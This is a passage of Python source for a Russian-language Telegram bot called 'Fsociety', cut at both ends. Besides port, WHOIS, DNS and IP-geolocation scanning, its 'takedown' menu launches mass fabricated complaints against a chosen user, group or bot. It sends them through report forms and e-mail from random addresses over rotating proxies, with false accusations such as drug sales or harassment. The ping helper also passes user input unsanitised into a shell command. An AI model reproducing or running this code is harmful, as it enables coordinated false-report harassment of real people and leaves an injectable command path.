                        993: 'IMAPS', 995: 'POP3S', 1723: 'PPTP', 3306: 'MySQL',
                        3389: 'RDP', 5900: 'VNC', 8080: 'HTTP Proxy', 8443: 'HTTPS Alt'
                    }.get(port, str(port))
                    
                    open_ports.append(f"{port} ({port_name})")
            except:
                continue
        
        if open_ports:
            return f"Открытые порты:\n" + "\n".join(open_ports)
        else:
            return "Основные порты закрыты или недоступны"
    except:
        return "Ошибка сканирования портов"

async def full_website_scan(target: str) -> str:
    """Полное сканирование сайта"""
    results = []
    
    # Получаем IP адрес
    try:
        ip = socket.gethostbyname(target)
        results.append(f"Цель: {target}")
        results.append(f"IP адрес: {ip}")
    except:
        results.append(f"Цель: {target}")
        results.append("Не удалось получить IP адрес")
        ip = target
    
    # Геолокация
    results.append("\nГЕОЛОКАЦИЯ:")
    geo_info = get_geolocation_info(ip)
    if geo_info:
        results.append(f"Страна: {geo_info['country']} ({geo_info['country_code']})")
        results.append(f"Регион: {geo_info['region']}")
        results.append(f"Город: {geo_info['city']}")
        if geo_info.get('district'):
            results.append(f"Район: {geo_info['district']}")
        results.append(f"Провайдер: {geo_info['isp']}")
        results.append(f"Организация: {geo_info['org']}")
        results.append(f"AS: {geo_info['as']}")
        results.append(f"Мобильный: {'Да' if geo_info['mobile'] else 'Нет'}")
        results.append(f"Прокси: {'Да' if geo_info['proxy'] else 'Нет'}")
        results.append(f"Хостинг: {'Да' if geo_info['hosting'] else 'Нет'}")
        
        if geo_info.get('lat') and geo_info.get('lon'):
            maps_url = f"https://maps.google.com/?q={geo_info['lat']},{geo_info['lon']}"
            results.append(f"Карты: {maps_url}")
    else:
        results.append("Геолокация недоступна")
    
    # WHOIS
    results.append("\nWHOIS ИНФОРМАЦИЯ:")
    whois_result = get_whois_info(target)
    if len(whois_result) > 500:
        whois_result = whois_result[:500] + "\n... (вывод обрезан)"
    results.append(whois_result)
    
    # DNS
    results.append("\nDNS ЗАПИСИ:")
    dns_result = get_dns_info(target)
    if len(dns_result) > 500:
        dns_result = dns_result[:500] + "\n... (вывод обрезан)"
    results.append(dns_result)
    
    # Технологии
    results.append("\nТЕХНОЛОГИИ САЙТА:")
    tech_result = get_website_tech(target)
    results.append(tech_result)
    
    # Порты
    results.append("\nСКАНИРОВАНИЕ ПОРТОВ:")
    port_result = scan_ports(ip)
    results.append(port_result)
    
    # Ping
    results.append("\nПРОВЕРКА ДОСТУПНОСТИ:")
    try:
        ping_result = run_cmd(f"ping -c 2 -W 1 {ip}")
        if "1 received" in ping_result or "ttl=" in ping_result.lower():
            import re
            time_match = re.search(r'time=([\d.]+)', ping_result)
            if time_match:
                results.append(f"Доступен, время отклика: {time_match.group(1)}ms")
            else:
                results.append("Доступен")
        else:
            results.append("Недоступен")
    except:
        results.append("Ошибка проверки")
    
    return "\n".join(results)

async def scan_ip_geolocation(ip: str) -> str:
    """Детальное сканирование IP по геолокации"""
    results = []
    
    results.append(f"ДЕТАЛЬНАЯ ГЕОЛОКАЦИЯ IP: {ip}")
    results.append("="*50)
    
    geo_info = get_geolocation_info(ip)
    
    if not geo_info:
        return "Не удалось получить геолокацию для этого IP"
    
    # Основная информация
    results.append(f"\nОСНОВНАЯ ИНФОРМАЦИЯ:")
    results.append(f"IP адрес: {geo_info['ip']}")
    results.append(f"Страна: {geo_info['country']} ({geo_info['country_code']})")
    results.append(f"Регион: {geo_info['region']}")
    results.append(f"Город: {geo_info['city']}")
    
    if geo_info.get('district'):
        results.append(f"Район: {geo_info['district']}")
    
    if geo_info.get('zip'):
        results.append(f"Почтовый индекс: {geo_info['zip']}")
    
    results.append(f"Часовой пояс: {geo_info['timezone']}")
    
    # Координаты
    if geo_info.get('lat') and geo_info.get('lon'):
        results.append(f"\nКООРДИНАТЫ:")
        results.append(f"Широта: {geo_info['lat']}")
        results.append(f"Долгота: {geo_info['lon']}")
        maps_url = f"https://maps.google.com/?q={geo_info['lat']},{geo_info['lon']}"
        results.append(f"Ссылка на карты: {maps_url}")
    
    # Провайдер и организация
    results.append(f"\nПРОВАЙДЕР И ОРГАНИЗАЦИЯ:")
    results.append(f"Интернет-провайдер: {geo_info['isp']}")
    results.append(f"Организация: {geo_info['org']}")
    results.append(f"AS номер: {geo_info['as']}")
    
    # Характеристики
    results.append(f"\nХАРАКТЕРИСТИКИ:")
    results.append(f"Мобильное соединение: {'Да' if geo_info['mobile'] else 'Нет'}")
    results.append(f"Прокси/VPN: {'Да' if geo_info['proxy'] else 'Нет'}")
    results.append(f"Хостинг/Дата-центр: {'Да' if geo_info['hosting'] else 'Нет'}")
    
    # Проверка портов
    results.append(f"\nОСНОВНЫЕ ПОРТЫ:")
    port_result = scan_ports(ip)
    results.append(port_result)
    
    # WHOIS кратко
    results.append(f"\nWHOIS (КРАТКО):")
    whois_result = get_whois_info(ip)
    if len(whois_result) > 300:
        whois_result = whois_result[:300] + "\n... (вывод обрезан)"
    results.append(whois_result)
    
    # Ping тест
    results.append(f"\nПРОВЕРКА ДОСТУПНОСТИ:")
    try:
        ping_result = run_cmd(f"ping -c 2 -W 1 {ip}")
        if "1 received" in ping_result or "ttl=" in ping_result.lower():
            import re
            time_match = re.search(r'time=([\d.]+)', ping_result)
            if time_match:
                results.append(f"Статус: Доступен")
                results.append(f"Время отклика: {time_match.group(1)}ms")
            else:
                results.append("Статус: Доступен")
        else:
            results.append("Статус: Недоступен")
    except:
        results.append("Статус: Ошибка проверки")
    
    # Рекомендации
    results.append(f"\nРЕКОМЕНДАЦИИ:")
    if geo_info['proxy']:
        results.append("Внимание: IP использует прокси/VPN")
    if geo_info['hosting']:
        results.append("Внимание: IP принадлежит дата-центру")
    if not geo_info['proxy'] and not geo_info['hosting']:
        results.append("IP похож на обычного пользователя")
    
    return "\n".join(results)

# Функции атаки
async def send_mass_complaints(username: str, telegram_id: str, phone: str, complaint_type: str, loops: int = 5) -> Tuple[int, int]:
    complaint_text = COMPLAINT_TEXTS.get(complaint_type, "").format(
        username=username,
        telegram_id=telegram_id,
        number=phone
    )
    
    if not complaint_text:
        return 0, 0
    
    complaints_sent = 0
    emails_sent = 0
    
    for i in range(loops):
        # Отправка жалобы через форму
        email_for_complaint = generate_random_email()
        proxy = {'http': random.choice(PROXIES_LIST)} if PROXIES_LIST else None
        
        complaints = send_complaint(username, telegram_id, phone, email_for_complaint, 1, complaint_text, proxy)
        complaints_sent += complaints
        
        # Отправка email жалоб
        for j, (sender_email, sender_password) in enumerate(list(senders.items())[:3]):
            for receiver in receivers[:2]:
                if send_email(receiver, sender_email, sender_password, 'Report', complaint_text):
                    emails_sent += 1
        
        await asyncio.sleep(0.5)
    
    return complaints_sent, emails_sent

async def send_link_complaint(link: str, is_bot: bool = False) -> Tuple[int, int]:
    complaint_text = COMPLAINT_TEXTS["bot_link" if is_bot else "link"].format(link=link)
    
    complaints_sent = 0
    emails_sent = 0
    
    for i in range(3):
        email_for_complaint = generate_random_email()
        proxy = {'http': random.choice(PROXIES_LIST)} if PROXIES_LIST else None
        
        complaints = send_complaint("", "", "", email_for_complaint, 1, complaint_text, proxy)
        complaints_sent += complaints
        
        for j, (sender_email, sender_password) in enumerate(list(senders.items())[:2]):
            for receiver in receivers[:2]:
                if send_email(receiver, sender_email, sender_password, 'Report', complaint_text):
                    emails_sent += 1
        
        await asyncio.sleep(0.5)
    
    return complaints_sent, emails_sent

@dp.message(Command("start", "menu"))
async def start_cmd(message: Message):
    user_id = message.from_user.id
    
    if not await check_subscription(user_id):
        await message.answer(
            f"Для использования бота необходимо подписаться на наш канал!\n\n"
            f"Канал: {CHANNEL_USERNAME}\n"
            f"После подписки нажмите кнопку ниже:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Я подписался", callback_data="check_subscription")],
                [InlineKeyboardButton(text="Перейти в канал", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")]
            ])
        )
        return
    
    await db.update_subscription(user_id, True)
    stats_text, keyboard = await main_menu()
    
    text = f"""
Добро пожаловать в бота Fsociety!
Ваш ID: {user_id} 

Выберите раздел:
"""
    await message.answer(text, reply_markup=keyboard)

@dp.callback_query(F.data == "check_subscription")
async def check_subscription_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    
    if await check_subscription(user_id):
        await db.update_subscription(user_id, True)
        stats_text, keyboard = await main_menu()
        
        text = f"""
Спасибо за подписку!

Теперь вы можете использовать все функции бота.

Выберите раздел:
"""
        # Проверяем, изменилось ли содержимое перед редактированием
        if callback.message.text != text or callback.message.reply_markup != keyboard:
            await callback.message.edit_text(text, reply_markup=keyboard)
    else:
        await callback.answer(
            "Вы еще не подписались на канал!",
            show_alert=True
        )

@dp.callback_query(F.data == "menu_main")
async def main_menu_callback(callback: CallbackQuery):
    stats_text, keyboard = await main_menu()
    
    text = f"""
Главное меню Fsociety

Выберите раздел:
"""
    # Проверяем, изменилось ли содержимое перед редактированием
    if callback.message.text != text or callback.message.reply_markup != keyboard:
        await callback.message.edit_text(text, reply_markup=keyboard)
    else:
        await callback.answer()

# МЕНЮ ПРОВЕРКИ НА ФИШИНГ
@dp.callback_query(F.data == "menu_phishing")
async def phishing_menu_callback(callback: CallbackQuery):
    text = """
ПРОВЕРКА ССЫЛКИ НА ФИШИНГ

Бот проанализирует ссылку на наличие признаков фишинга:
- Подозрительные домены
- Опечатки в официальных доменах
- Ключевые слова, характерные для фишинга
- Структура URL
- Использование IP вместо домена
- Сокращатели ссылок
- Наличие HTTPS

Введите ссылку для проверки:
"""
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Назад", callback_data="menu_main")]
    ])
    
    # Проверяем, изменилось ли содержимое перед редактированием
    if callback.message.text != text or callback.message.reply_markup != keyboard:
        await callback.message.edit_text(text, reply_markup=keyboard)
    else:
        await callback.answer()
    
    await PhishingCheckStates.waiting_for_link.set()

@dp.message(PhishingCheckStates.waiting_for_link)
async def process_phishing_check(message: Message, state: FSMContext):
    link = message.text.strip()
    
    processing_msg = await message.answer("Проверка ссылки на признаки фишинга...")
    
    try:
        is_phishing, score, details = await check_phishing_link(link)
        
        # Сохраняем результат в БД
        await db.save_phishing_check(
            user_id=message.from_user.id,
            link=link,
            is_phishing=is_phishing,
            score=score,
            details=details[:500]
        )
        
        result_text = f"""
РЕЗУЛЬТАТ ПРОВЕРКИ ССЫЛКИ:

{link}

{details}

Вероятность фишинга: {score * 100:.1f}%
Статус: {"ФИШИНГ ОБНАРУЖЕН" if is_phishing else "БЕЗОПАСНО"}
"""
        
        await processing_msg.edit_text(result_text)
        
        # Возвращаемся в меню фишинга
        await message.answer("Выберите действие:", reply_markup=phishing_menu())
        
    except Exception as e:
        logger.error(f"Phishing check error: {e}")
        await processing_msg.edit_text(f"Ошибка при проверке ссылки: {str(e)[:200]}")
    
    await state.clear()

# Команда для быстрой проверки фишинга
@dp.message(Command("phishing", "checkphish"))
async def phishing_cmd(message: Message):
    await db.log_command(message.from_user.id, "phishing")
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("Использование: /phishing [ссылка]\nПример: /phishing https://telegram-login.com")
        return
    
    link = args[1].strip()
    
    processing_msg = await message.answer("Проверка ссылки на признаки фишинга...")
    
    try:
        is_phishing, score, details = await check_phishing_link(link)
        
        await db.save_phishing_check(
            user_id=message.from_user.id,
            link=link,
            is_phishing=is_phishing,
            score=score,
            details=details[:500]
        )
        
        result_text = f"""
РЕЗУЛЬТАТ ПРОВЕРКИ ССЫЛКИ:

{link}

{details}

Вероятность фишинга: {score * 100:.1f}%
Статус: {"ФИШИНГ ОБНАРУЖЕН" if is_phishing else "БЕЗОПАСНО"}
"""
        
        await processing_msg.edit_text(result_text)
        
    except Exception as e:
        logger.error(f"Phishing check error: {e}")
        await processing_msg.edit_text(f"Ошибка при проверке ссылки: {str(e)[:200]}")

# МЕНЮ СКАНИРОВАНИЯ
@dp.callback_query(F.data == "menu_scan")
async def scan_menu_callback(callback: CallbackQuery):
    text = """


Выберите тип сканирования:

- Полное сканирование - все доступные инструменты
- WHOIS информация - данные о домене
- DNS записи - DNS информация через dig/nslookup
- Технологии сайта - определение технологий
- Сканирование портов - проверка открытых портов
- Геолокация IP - детальная геолокация IP адреса

Также используйте команды:
/scan [цель] - полное сканирование
/geo [IP] - геолокация IP
/whois [домен] - WHOIS информация
/dns [домен] - DNS записи
/tech [сайт] - технологии сайта
/ports [IP] - сканирование портов
"""
    # Проверяем, изменилось ли содержимое перед редактированием
    if callback.message.text != text or callback.message.reply_markup != scan_menu():
        await callback.message.edit_text(text, reply_markup=scan_menu())
    else:
        await callback.answer()

@dp.callback_query(F.data == "full_scan")
async def full_scan_callback(callback: CallbackQuery, state: FSMContext):
    await state.set_state(ScanStates.waiting_for_target)
    await state.update_data(scan_type="full")
    
    text = """
ПОЛНОЕ СКАНИРОВАНИЕ

Введите домен или IP адрес для полного сканирования:

Примеры:
- google.com
- 8.8.8.8
- example.org
"""
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отмена", callback_data="menu_scan")]
    ])
    
    # Проверяем, изменилось ли содержимое перед редактированием
    if callback.message.text != text or callback.message.reply_markup != keyboard:
        await callback.message.edit_text(text, reply_markup=keyboard)
    else:
        await callback.answer()

@dp.callback_query(F.data == "whois_scan")
async def whois_scan_callback(callback: CallbackQuery, state: FSMContext):
    await state.set_state(ScanStates.waiting_for_target)
    await state.update_data(scan_type="whois")
    
    text = """
WHOIS СКАНИРОВАНИЕ

Введите домен для получения WHOIS информации:

Примеры:
- google.com
- example.org
- github.com
"""
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отмена", callback_data="menu_scan")]
    ])
    
    # Проверяем, изменилось ли содержимое перед редактированием
    if callback.message.text != text or callback.message.reply_markup != keyboard:
        await callback.message.edit_text(text, reply_markup=keyboard)
    else:
        await callback.answer()

@dp.callback_query(F.data == "dns_scan")
async def dns_scan_callback(callback: CallbackQuery, state: FSMContext):
    await state.set_state(ScanStates.waiting_for_target)
    await state.update_data(scan_type="dns")
    
    text = """
DNS СКАНИРОВАНИЕ

Введите домен для получения DNS записей:

Использует dig и nslookup для получения:
- A записи
- MX записи
- NS записи
- TXT записи
"""
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отмена", callback_data="menu_scan")]
    ])
    
    # Проверяем, изменилось ли содержимое перед редактированием
    if callback.message.text != text or callback.message.reply_markup != keyboard:
        await callback.message.edit_text(text, reply_markup=keyboard)
    else:
        await callback.answer()

@dp.callback_query(F.data == "tech_scan")
async def tech_scan_callback(callback: CallbackQuery, state: FSMContext):
    await state.set_state(ScanStates.waiting_for_target)
    await state.update_data(scan_type="tech")
    
    text = """
АНАЛИЗ ТЕХНОЛОГИЙ

Введите URL сайта для определения технологий:

Определяет:
- Веб-сервер (Apache, Nginx, IIS)
- CMS (WordPress, Joomla, Drupal)
- Фреймворки (Laravel, React, Angular)
- Скриптовые языки
"""
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отмена", callback_data="menu_scan")]
    ])
    
    # Проверяем, изменилось ли содержимое перед редактированием
    if callback.message.text != text or callback.message.reply_markup != keyboard:
        await callback.message.edit_text(text, reply_markup=keyboard)
    else:
        await callback.answer()

@dp.callback_query(F.data == "port_scan")
async def port_scan_callback(callback: CallbackQuery, state: FSMContext):
    await state.set_state(ScanStates.waiting_for_target)
    await state.update_data(scan_type="ports")
    
    text = """
СКАНИРОВАНИЕ ПОРТОВ

Введите IP адрес или домен для сканирования портов:

Проверяет основные порты:
- 21 (FTP), 22 (SSH), 23 (Telnet)
- 25 (SMTP), 53 (DNS), 80 (HTTP)
- 443 (HTTPS), 3306 (MySQL), 3389 (RDP)
- и другие важные порты
"""
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отмена", callback_data="menu_scan")]
    ])
    
    # Проверяем, изменилось ли содержимое перед редактированием
    if callback.message.text != text or callback.message.reply_markup != keyboard:
        await callback.message.edit_text(text, reply_markup=keyboard)
    else:
        await callback.answer()

@dp.callback_query(F.data == "geo_scan")
async def geo_scan_callback(callback: CallbackQuery, state: FSMContext):
    await state.set_state(ScanStates.waiting_for_target)
    await state.update_data(scan_type="geo")
    
    text = """


Введите IP адрес для детальной геолокации:

Показывает:
- Страну, регион, город
- Координаты (широта/долгота)
- Провайдера и организацию
- Тип соединения (мобильное, прокси)
- Карту местоположения
"""
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отмена", callback_data="menu_scan")]
    ])
    
    # Проверяем, изменилось ли содержимое перед редактированием
    if callback.message.text != text or callback.message.reply_markup != keyboard:
        await callback.message.edit_text(text, reply_markup=keyboard)
    else:
        await callback.answer()

@dp.message(ScanStates.waiting_for_target)
async def process_scan_target(message: Message, state: FSMContext):
    target = message.text.strip()
    data = await state.get_data()
    scan_type = data.get('scan_type', 'full')
    
    await db.log_command(message.from_user.id, f"scan_{scan_type}")
    
    processing_msg = await message.answer(f"Сканирую {target}...")
    
    try:
        if scan_type == 'full':
            result = await full_website_scan(target)
            scan_title = "Полное сканирование"
        elif scan_type == 'whois':
            result = get_whois_info(target)
            scan_title = "WHOIS информация"
        elif scan_type == 'dns':
            result = get_dns_info(target)
            scan_title = "DNS записи"
        elif scan_type == 'tech':
            result = get_website_tech(target)
            scan_title = "Технологии сайта"
        elif scan_type == 'ports':
            # Получаем IP если передан домен
            try:
                ip = socket.gethostbyname(target) if '.' in target and not target.replace('.', '').isdigit() else target
                result = scan_ports(ip)
            except:
                result = scan_ports(target)
            scan_title = "Сканирование портов"
        elif scan_type == 'geo':
            # Проверяем, это IP или домен
            if '.' in target and not target.replace('.', '').isdigit():
                try:
                    ip = socket.gethostbyname(target)
                except:
                    ip = target
            else:
                ip = target
            result = await scan_ip_geolocation(ip)
            scan_title = "Геолокация IP"
        else:
            result = "Неизвестный тип сканирования"
            scan_title = "Ошибка"
        
        # Сохраняем результат
        await db.save_scan(
            user_id=message.from_user.id,
            scan_type=scan_type,
            target=target,
            result=result[:1000] if len(result) > 1000 else result
        )
        
        # Отправляем результат
        if len(result) > 4000:
            # Разбиваем на части
            parts = [result[i:i+4000] for i in range(0, len(result), 4000)]
            for i, part in enumerate(parts):
                if i == 0:
                    await processing_msg.edit_text(f"{scan_title}: {target}\n\n{part}")
                else:
                    await message.answer(f"{scan_title} (часть {i+1}):\n\n{part}")
        else:
            await processing_msg.edit_text(f"{scan_title}: {target}\n\n{result}")
    
    except Exception as e:
        logger.error(f"Scan error: {e}")
        await processing_msg.edit_text(f"Ошибка при сканировании: {str(e)[:200]}")
    
    await state.clear()

# КОМАНДЫ СКАНИРОВАНИЯ
@dp.message(Command("scan"))
async def scan_cmd(message: Message):
    await db.log_command(message.from_user.id, "scan")
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("""
Использование: /scan цель

Примеры:
/scan google.com
/scan 8.8.8.8
/scan example.org

Выполняет полное сканирование включая:
- Геолокацию
- WHOIS информацию
- DNS записи
- Технологии сайта
- Сканирование портов
""")
        return
    
    target = args[1].strip()
    processing_msg = await message.answer(f"Полное сканирование {target}...")
    
    try:
        result = await full_website_scan(target)
        
        await db.save_scan(
            user_id=message.from_user.id,
            scan_type="full_cmd",
            target=target,
            result=result[:1000] if len(result) > 1000 else result
        )
        
        if len(result) > 4000:
            parts = [result[i:i+4000] for i in range(0, len(result), 4000)]
            for i, part in enumerate(parts):
                if i == 0:
                    await processing_msg.edit_text(f"Полное сканирование: {target}\n\n{part}")
                else:
                    await message.answer(f"Полное сканирование (часть {i+1}):\n\n{part}")
        else:
            await processing_msg.edit_text(f"Полное сканирование: {target}\n\n{result}")
    
    except Exception as e:
        logger.error(f"Scan error: {e}")
        await processing_msg.edit_text(f"Ошибка при сканировании: {str(e)[:200]}")

@dp.message(Command("geo"))
async def geo_cmd(message: Message):
    await db.log_command(message.from_user.id, "geo")
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("""
Использование: /geo IP или домен

Примеры:
/geo 8.8.8.8
/geo google.com
/geo 1.1.1.1

Показывает детальную геолокацию:
- Страну, регион, город
- Координаты и карту
- Провайдера и организацию
- Характеристики соединения
""")
        return
    
    target = args[1].strip()
    
    # Определяем IP
    if '.' in target and not target.replace('.', '').isdigit():
        try:
            ip = socket.gethostbyname(target)
        except:
            ip = target
    else:
        ip = target
    
    processing_msg = await message.answer(f"Геолокация {ip}...")
    
    try:
        result = await scan_ip_geolocation(ip)
        
        await db.save_scan(
            user_id=message.from_user.id,
            scan_type="geo_cmd",
            target=ip,
            result=result[:1000] if len(result) > 1000 else result
        )
        
        if len(result) > 4000:
            parts = [result[i:i+4000] for i in range(0, len(result), 4000)]
            for i, part in enumerate(parts):
                if i == 0:
                    await processing_msg.edit_text(f"{part}")
                else:
                    await message.answer(f"Геолокация (часть {i+1}):\n\n{part}")
        else:
            await processing_msg.edit_text(f"{result}")
    
    except Exception as e:
        logger.error(f"Geo scan error: {e}")
        await processing_msg.edit_text(f"Ошибка при геолокации: {str(e)[:200]}")

@dp.message(Command("whois"))
async def whois_cmd(message: Message):
    await db.log_command(message.from_user.id, "whois")
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("Использование: /whois [домен]\nПример: /whois google.com")
        return
    
    domain = args[1].strip().lower()
    
    if not validate_domain(domain):
        await message.answer("Неверный формат домена")
        return
    
    processing_msg = await message.answer(f"WHOIS {domain}...")
    
    result = get_whois_info(domain)
    
    await db.save_scan(
        user_id=message.from_user.id,
        scan_type="whois_cmd",
        target=domain,
        result=result[:1000] if len(result) > 1000 else result
    )
    
    await processing_msg.edit_text(f"WHOIS {domain}:\n```\n{result}\n```", parse_mode='Markdown')

@dp.message(Command("dns", "dig", "nslookup"))
async def dns_cmd(message: Message):
    await db.log_command(message.from_user.id, "dns")
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("Использование: /dns [домен]\nПример: /dns google.com")
        return
    
    domain = args[1].strip().lower()
    
    if not validate_domain(domain):
        await message.answer("Неверный формат домена")
        return
    
    processing_msg = await message.answer(f"DNS записи {domain}...")
    
    result = get_dns_info(domain)
    
    await db.save_scan(
        user_id=message.from_user.id,
        scan_type="dns_cmd",
        target=domain,
        result=result[:1000] if len(result) > 1000 else result
    )
    
    await processing_msg.edit_text(f"DNS записи {domain}:\n```\n{result}\n```", parse_mode='Markdown')

@dp.message(Command("tech", "whatweb"))
async def tech_cmd(message: Message):
    await db.log_command(message.from_user.id, "tech")
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("Использование: /tech [сайт]\nПример: /tech https://google.com")
        return
    
    url = args[1].strip()
    
    processing_msg = await message.answer(f"Анализ Whatweb данных {url}...")
    
    result = get_website_tech(url)
    
    await db.save_scan(
        user_id=message.from_user.id,
        scan_type="tech_cmd",
        target=url,
        result=result[:1000] if len(result) > 1000 else result
    )
    
    await processing_msg.edit_text(f"Whatweb{url}:\n{result}")

@dp.message(Command("ports", "nmap"))
async def ports_cmd(message: Message):
    await db.log_command(message.from_user.id, "ports")
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer("Использование: /ports [IP или домен]\nПример: /ports 8.8.8.8")
        return
    
    target = args[1].strip()
    
    # Получаем IP если передан домен
    try:
        ip = socket.gethostbyname(target) if '.' in target and not target.replace('.', '').isdigit() else target
    except:
        ip = target
    
    processing_msg = await message.answer(f"Сканирование портов {ip}...")
    
    result = scan_ports(ip)
    
    await db.save_scan(
        user_id=message.from_user.id,
        scan_type="ports_cmd",
        target=ip,
        result=result[:1000] if len(result) > 1000 else result
    )
    
    await processing_msg.edit_text(f"Сканирование портов {ip}:\n{result}")

# МЕНЮ СНОСА
@dp.callback_query(F.data == "menu_attack_main")
async def attack_main_menu_callback(callback: CallbackQuery):
    text = """


Шанс сноса: 50%

Выберите тип атаки:
- Отправить жалобу - массовая отправка жалоб на аккаунт
- По ссылке - жалоба по прямой ссылке

также используйте команду:
/complaint username id phone type
"""
    # Проверяем, изменилось ли содержимое перед редактированием
    if callback.message.text != text or callback.message.reply_markup != attack_menu():
        await callback.message.edit_text(text, reply_markup=attack_menu())
    else:
        await callback.answer()

@dp.callback_query(F.data == "attack_complaint")
async def attack_complaint_callback(callback: CallbackQuery):
    text = """


Шанс сноса: 50%

Выберите тип жалобы:
1. Снос сессии - жалоба на взлом аккаунта
2. Мошенничество - жалоба на мошенничество
3. Спам - жалоба на спам/нежелательный контент
4. Боты - жалоба на ботов
5. Фейки - жалоба на фейковые новости
6. Домогательство - жалоба на домогательство
7. Продажа веществ - жалоба на продажу запрещенных веществ
8. Группы - жалоба на группы
"""
    # Проверяем, изменилось ли содержимое перед редактированием
    if callback.message.text != text or callback.message.reply_markup != complaint_type_menu():
        await callback.message.edit_text(text, reply_markup=complaint_type_menu())
    else:
        await callback.answer()

@dp.callback_query(F.data.startswith("complaint_"))
async def complaint_type_selected(callback: CallbackQuery, state: FSMContext):
    complaint_type = callback.data.split("_")[1]
    
    await state.update_data(complaint_type=complaint_type)
    await state.set_state(AttackStates.waiting_for_username)
    
    text = "Введите username цели (без @):"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отмена", callback_data="menu_attack_main")]
    ])
    
    # Проверяем, изменилось ли содержимое перед редактированием
    if callback.message.text != text or callback.message.reply_markup != keyboard:
        await callback.message.edit_text(text, reply_markup=keyboard)
    else:
        await callback.answer()

@dp.message(AttackStates.waiting_for_username)
async def process_username(message: Message, state: FSMContext):
    username = message.text.strip()
    await state.update_data(username=username)
    await state.set_state(AttackStates.waiting_for_telegram_id)
    
    await message.answer(
        "Введите Telegram ID цели (если неизвестен, введите 0):",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="menu_attack_main")]
        ])
    )

@dp.message(AttackStates.waiting_for_telegram_id)
async def process_telegram_id(message: Message, state: FSMContext):
    telegram_id = message.text.strip()
    await state.update_data(telegram_id=telegram_id)
    await state.set_state(AttackStates.waiting_for_phone)
    
    await message.answer(
        "Введите номер телефона для жалобы (формат: +71234567890):",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="menu_attack_main")]
        ])
    )

@dp.message(AttackStates.waiting_for_phone)
async def process_phone(message: Message, state: FSMContext):
    phone = message.text.strip()
    data = await state.get_data()
    
    username = data.get('username')
    telegram_id = data.get('telegram_id')
    complaint_type = data.get('complaint_type')
    
    await message.answer("Запуск массовой отправки жалоб...")
    
    try:
        complaints_sent, emails_sent = await send_mass_complaints(username, telegram_id, phone, complaint_type, loops=5)
        
        result_text = f"""
ОТПРАВКА ЖАЛОБ ЗАВЕРШЕНА

Цель: @{username}
ID: {telegram_id}
Тип жалобы: {complaint_type}

Отправлено жалоб через форму: {complaints_sent}
Отправлено email жалоб: {emails_sent}
Всего отправок: {complaints_sent + emails_sent}

Статус: Атака выполнена
"""
        
        await db.save_attack(
            user_id=message.from_user.id,
            attack_type="complaint",
            target_username=username,
            target_id=telegram_id,
            target_phone=phone,
            complaint_type=complaint_type,
            requests_sent=complaints_sent,
            emails_sent=emails_sent
        )
        
        await message.answer(result_text)
        
    except Exception as e:
        logger.error(f"Complaint attack error: {e}")
        await message.answer(f"Ошибка при отправке жалоб: {str(e)[:200]}")
    
    await state.clear()

@dp.callback_query(F.data == "attack_link")
async def attack_link_callback(callback: CallbackQuery, state: FSMContext):
    await state.set_state(AttackStates.waiting_for_link)
    
    text = "Введите ссылку на группу/канал/бота для отправки жалобы:"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отмена", callback_data="menu_attack_main")]
    ])
    
    # Проверяем, изменилось ли содержимое перед редактированием
    if callback.message.text != text or callback.message.reply_markup != keyboard:
        await callback.message.edit_text(text, reply_markup=keyboard)
    else:
        await callback.answer()

@dp.message(AttackStates.waiting_for_link)
async def process_attack_link(message: Message, state: FSMContext):
    link = message.text.strip()
    
    # Определяем, является ли ссылка на бота
    is_bot = '/bot' in link or '?start=' in link
    
    await message.answer("Запуск отправки жалобы по ссылке...")
    
    try:
        complaints_sent, emails_sent = await send_link_complaint(link, is_bot)
        
        result_text = f"""
ОТПРАВКА ЖАЛОБЫ ПО ССЫЛКЕ ЗАВЕРШЕНА

Ссылка: {link}
Тип: {"Бот" if is_bot else "Группа/Канал"}

Отправлено жалоб через форму: {complaints_sent}
Отправлено email жалоб: {emails_sent}
Всего отправок: {complaints_sent + emails_sent}

Статус: Атака выполнена
"""
        
        await db.save_attack(
            user_id=message.from_user.id,
            attack_type="link",
            target_link=link,
            requests_sent=complaints_sent,
            emails_sent=emails_sent
        )
        
        await message.answer(result_text)
        
    except Exception as e:
        logger.error(f"Link attack error: {e}")
        await message.answer(f"Ошибка при отправке жалобы: {str(e)[:200]}")
    
    await state.clear()

@dp.message(Command("complaint"))
async def complaint_cmd(message: Message):
    await db.log_command(message.from_user.id, "complaint")
    
    args = message.text.split()
    if len(args) < 5:
        await message.answer("""
Использование: /complaint username id phone type

Параметры:
username - юзернейм цели (без @)
id - Telegram ID цели (0 если неизвестен)
phone - номер телефона для жалобы
type - тип жалобы (1-8)

Пример: /complaint target 123456789 +71234567890 1
""")
        return
    
    username = args[1].strip()
    telegram_id = args[2].strip()
    phone = args[3].strip()
    complaint_type = args[4].strip()
    
    if complaint_type not in COMPLAINT_TEXTS or complaint_type == "link" or complaint_type == "bot_link":
        await message.answer("Неверный тип жалобы. Используйте 1-8")
        return
    
    await message.answer("Запуск массовой отправки жалоб...")
    
    try:
        complaints_sent, emails_sent = await send_mass_complaints(username, telegram_id, phone, complaint_type, loops=3)
        
